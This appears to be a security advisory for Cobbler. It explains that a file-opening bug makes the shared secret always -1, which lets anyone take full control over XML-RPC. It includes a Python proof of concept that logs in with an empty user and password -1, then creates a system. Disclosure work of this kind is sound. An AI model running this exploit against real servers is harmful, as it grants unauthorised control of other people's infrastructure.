summary: "cobbler allows anyone to connect to cobbler XML-RPC server with known password and\
  \ make changes\n### Summary\n\nutils.get_shared_secret() always returns -1 - allows anyone\
  \ to connect to cobbler XML-RPC as user '' password -1 and make any changes.\n\n### Details\n\
  utils.py get_shared_secret:\n```\ndef get_shared_secret() -> Union[str, int]:\n    \"\"\"\n\
  \    The 'web.ss' file is regenerated each time cobblerd restarts and is used to agree on\
  \ shared secret interchange\n    between the web server and cobblerd, and also the CLI and\
  \ cobblerd, when username/password access is not required.\n    For the CLI, this enables\
  \ root users to avoid entering username/pass if on the Cobbler server.\n\n    :return: The\
  \ Cobbler secret which enables full access to Cobbler.\n    \"\"\"\n\n    try:\n        with\
  \ open(\"/var/lib/cobbler/web.ss\", 'rb', encoding='utf-8') as fd:\n            data = fd.read()\n\
  \    except:\n        return -1\n    return str(data).strip()\n```\nAlways returns `-1` because\
  \ of the following exception:\n```\nbinary mode doesn't take an encoding argument\n ```\n\n\
  This appears to have been introduced by commit 32c5cada013dc8daa7320a8eda9932c2814742b0 and\
  \ so affects versions 3.0.0+.\n\n### PoC\n```\n#!/usr/bin/python3\n\nimport ssl\n import xmlrpc.client\n\
  \nparams = { 'proto': 'https', 'host': 'COBBLER_SERVER', 'port': '443', 'username': '', 'password':\
  \ -1 }\nssl_context = ssl._create_unverified_context()\n \nurl = '{proto}://{host}:{port}/cobbler_api'.format(**params)\n\
  if ssl_context:\n    conn = xmlrpc.client.ServerProxy(url, context=ssl_context)\nelse:\n \
  \   conn = xmlrpc.client.Server(url)\n\ntry:\n    token = conn.login(params['username'], params['password'])\n\
  except xmlrpc.client.Fault as e:\n    print(\"Failed to log in to Cobbler '{url}' as '{username}'.\
  \ {error}\".format(url=url, error=e, **params))\n except Exception as e:\n    print(\"Connection\
  \ to '{url}' failed. {error}\".format(url=url, error=e, **params))\n\nprint(\"Login success!\"\
  )\n\nsystem_id = conn.new_system(token)\n ```\n\n\n### Impact\nThis gives anyone with network\
  \ access to a cobbler server full control of the server."
